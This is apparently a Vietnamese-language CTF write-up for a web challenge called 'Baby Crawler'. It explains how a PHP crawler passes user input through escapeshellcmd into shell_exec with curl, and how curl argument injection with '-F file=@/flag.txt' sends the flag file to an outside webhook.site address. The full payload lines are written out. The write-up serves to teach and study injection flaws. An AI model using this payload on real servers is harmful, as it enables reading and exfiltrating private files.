---
title: Write-Up Baby Crawler
date: 2023-09-17 12:34:01 +0700
categories: [CTF, Cookie Hân Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
Công cụ crawl bài viết từ các trang báo

## Tổng quan

- Để giải được challenge này, ta cần vận dụng kiến thức về Command injection và khả năng đọc code PHP cũng như cách dùng curl, nếu bạn không có thì cũng chả sao :D tra google cách dùng như mình là được
- dùng phương pháp hướng ngoại khi hướng nội không giải quyết được gì =)))
- công cụ: Burpsuite, webhook

## Phân tích bài

- vào website, ta thấy được rằng đây là 1 trang web dùng để curl dữ liệu

<img src="/assets/writeup/cookie/Baby Crawler/0.png">
- đầu tiên ta thử test 1 số chức năng là crawl cũng như check view-source.

<img src="/assets/writeup/cookie/Baby Crawler/0.png">

- phát hiện có biến /?debug , thử truy cập để xem có gì hấp dẫn

<img src="/assets/writeup/cookie/Baby Crawler/0.png">

- ta tìm được mã nguồn của bài, có vẻ đây là phần miêu tả chức năng crawl của challenge này.

<img src="/assets/writeup/cookie/Baby Crawler/0.png">

- đọc mã nguồn, ta dễ dàng nhận biết được rằng biến `$url` trong đoạn code sau chính là 1 **untrusted data,** kèm theo đó `$result` đang thực hiện một unsafe method là `shell_exec`, giống như toán học thôi!
    
    `unsafe method + untrusted data = vỡ mồm nhé các bạn :D`
    
- giờ công việc của ta là tập trung khai thác biến url đó, thử test 1 số payload của lỗi command injection như `; |` hay `&&` nhưng có vẻ nohope lắm :D, tất cả là tại thằng `escapeshellcmd($url)` đã filter `&#;` `*?~<>^()[]{}$\ , \x0A và \xFF`.
- Vậy giờ sao?, chuyển sang làm hacker hướng ngoại, ta tận dụng luôn thằng curl để gửi request sang bên ngoài, ở đây mình sử dụng webhook để bắn nội dung của file sang server của mình :D, học trò CBJS là phải biết dùng webhook nha!

<img src="/assets/writeup/cookie/Baby Crawler/0.png">

- Test nhẹ thì thấy được rằng có thể gửi được dữ liệu ra ngoài, lúc này vấn đề ta cần phải xem xét đó chính là làm sao để gửi được file ra ngoài ?, lúc này tui dạo trên google thì phát hiện ra chức năng curl có cung cấp option -F cho phép gửi file.

<img src="/assets/writeup/cookie/Baby Crawler/1.png">

- sử dụng payload như sau:

`-F file=@/flag.txt https://webhook.site/95993bde-b91d-4ffc-9278-cb237fa8059e`

- tuy nhiên ta lại bị 1 lỗi như sau

<img src="/assets/writeup/cookie/Baby Crawler/2.png">

- kiểm tra mã nguồn thì ta thấy rằng

<img src="/assets/writeup/cookie/Baby Crawler/3.png">

- tra chat GPT thì chúng ta chỉ cần thêm 1 biến http vào đầu payload thì sẽ giải được thoai.

<img src="/assets/writeup/cookie/Baby Crawler/4.png">

`payload:  http://13.215.248.36:32172/ -F file=@/flag.txt webhookcuamay`

---

`example payload: http://13.215.248.36:32172/ -F file=@/flag.txt [https://webhook.site/95993bde-b91d-4ffc-9278-cb237fa8059e](https://webhook.site/95993bde-b91d-4ffc-9278-cb237fa8059e*)`

<img src="/assets/writeup/cookie/Baby Crawler/5.png">

<img src="/assets/writeup/cookie/Baby Crawler/6.png">

- **Vậy là hoàn thành challenges trên, cũng khá đơn giản phải ko nào =)))))))))))**
